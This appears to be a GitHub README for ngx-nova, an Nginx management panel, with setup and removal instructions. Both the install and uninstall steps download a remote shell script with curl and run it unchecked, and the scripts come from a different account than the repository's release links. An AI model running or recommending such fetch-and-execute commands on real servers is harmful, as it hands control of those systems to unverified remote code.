# 🚀 ngx-nova - Simple Nginx Management Tool  

[![Download ngx-nova](https://img.shields.io/badge/Download-ngx--nova-brightgreen)](https://github.com/jatinsa00/ngx-nova/releases)

## 🌟 Overview

ngx-nova is a lightweight visual management panel for Nginx. It uses less than 20MB of memory. This tool helps you handle common tasks like installation, site management, port forwarding, backups, and log viewing. It's ideal for long-term use on VPS or in production environments.

## ✨ Features

- **Simple Deployment**: Single binary file with static front-end, using minimal resources.
- **One-Click Install/Uninstall**: Built-in scripts allow for quick Nginx deployment or cleanup.
- **Site and Forwarding Management**: Create, edit, or delete sites and stream forwarding configurations easily. Automatic reloading included.
- **One-Click Backup and Restore**: Local backups with automatic daily backups to Cloudflare R2.
- **Log Center**: Visual aggregation of access and error logs by domain. Supports refreshing and independent views.
- **Automated SSL Management**: Built-in ACME automation handles HTTPS certificate requests and renewals automatically.

## 🚀 Getting Started

Follow these steps to install and run ngx-nova:

1. **Open Firewall**

   Allow access to port 8083.

   ```bash
   ufw allow 8083/tcp
   ```

2. **Run Installation Script**

   Use the following command to download and run the installation script.

   ```bash
   curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/ngx.sh && chmod +x ngx.sh && ./ngx.sh
   ```

3. **Access the Panel**

   Go to your web browser and enter `http://ip:8083/ui/` to set your login token for the first time.

   If you need to change your token, use this command:

   ```bash
   tokenctl --set "your_token" --file /opt/nginx-mgr/auth_token.json
   ```

## ❌ Uninstall ngx-nova

If you need to uninstall ngx-nova, run:

   ```bash
   curl -sS -O https://raw.githubusercontent.com/woniu336/open_shell/main/uni-ngx.sh && chmod +x uni-ngx.sh && ./uni-ngx.sh
   ```

## 🔧 System Requirements

- **Operating System**: Linux (recommended: Ubuntu, CentOS)
- **Memory**: At least 512MB RAM
- **Disk Space**: Minimum 20MB free space
- **Network**: Internet connection for initial setup

## 💡 Design Philosophy

- **Keep It Simple**: No unnecessary features, just the essentials.
- **Safety First**: All operations should not risk crashing online services.
- **Long-term Usability**: Stable performance, low resource use, and minimal maintenance.

## 👥 Who Is This For?

- Individual VPS users
- Those who self-host websites or reverse proxies
- Developers and operations personnel seeking a stable and controllable management experience 

## 📥 Download & Install

To download ngx-nova, visit the [Releases Page](https://github.com/jatinsa00/ngx-nova/releases). Follow the installation instructions above to get started easily.

[![Download ngx-nova](https://img.shields.io/badge/Download-ngx--nova-brightgreen)](https://github.com/jatinsa00/ngx-nova/releases)

## 📚 Additional Resources

- For more details and updates, refer to the GitHub repository [here](https://github.com/jatinsa00/ngx-nova).
- Check community discussions for tips and troubleshooting.

Embrace a streamlined approach to managing your Nginx setup with ngx-nova!